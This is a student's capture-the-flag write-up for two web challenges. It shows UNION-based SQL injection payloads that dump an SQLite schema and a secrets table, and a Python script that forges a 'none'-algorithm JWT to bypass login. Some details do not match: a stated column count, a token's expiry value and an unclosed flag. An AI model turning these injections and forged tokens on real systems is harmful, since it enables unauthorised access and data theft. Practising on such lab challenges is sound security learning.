# 1. Database Incursion V2

## Solution:

- i used UNION operator based injections to get through the initial login page to get the employee list.Then as hinted i searched for Management department employee then found that Kiwi had the passcode but i found multiple Kiwis. So i filtered out the one from the Management and got the passcode to the admin panel.Then i figured out the number of columns as 4 and then i extracted the schemas. Then found that CITADEL_ARCHIVE_2077 had the flag in archive data so i used a payload to show that and got the flag.

For this payload 
```bash
' UNION SELECT ID, Name, Department, Email, Notes FROM employees WHERE Name LIKE '%Kiwi%' AND Department='Management' --
```

For this payload 
```bash
' UNION SELECT 1, name, sql, 'schema' FROM sqlite_master --
```

For this payload 
```bash
' UNION SELECT secrets, 'archive data', '', '' FROM "CITADEL_ARCHIVE_2077" --
```

## Flag:

```
CITADEL{571ll_d0n7_kn0w_1f_175_53qu3l_0r_5ql?}
```

## Concepts learnt:

- I learned how to use specific sql injections after carefully understanding each error. 

## Notes:

- i kept trying with MySQL database injections but they kept failing so then changin those to SQLite worked.I assumed some number of columns without counting so that kept giving error.

#2 . Temporal Token

I made my own website with custom auth, but why can't i login with my credentials?

```
Username: Belegar
Password: Ironhammer
```

Directly access the challenge server at https://temporal-token.nitephase.live

## Solution:

- i tried to login with the given id but it returned token expired so i used inspect tool and viewed the token value. This value was a  JWT format token. So i tried checking if the token were being verified and found it wasn't doing that. So using jwt library in python i set the algorithm to none and printed the jwt token with subject as Belegar. Then i changed the token value in the website and refresh it to get the flag.

The JWT token generating script:
```python
import jwt  
payload = {"sub": "Belegar","exp": 9999 }
token = jwt.encode(payload, key="", algorithm="none")
print(token)
```
The output token for this script:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiJCZWxlZ2FyIiwiZXhwIjo5OTk5OTk5OTk5fQ.
```

After changing the token value to the obtained jwt token from python script:

## Flag:

```
nite{50_y0u_kn0w_h0w_jw75_w0rk_n0w?
```

## Concepts learnt:

- I learned how JWT is made using different algorithms and how weak verification codes for JWT token can be exploited.

## Notes:

- i kept trying messing up the python script for token generation and learnt about the none algorithm attack from the resource below.
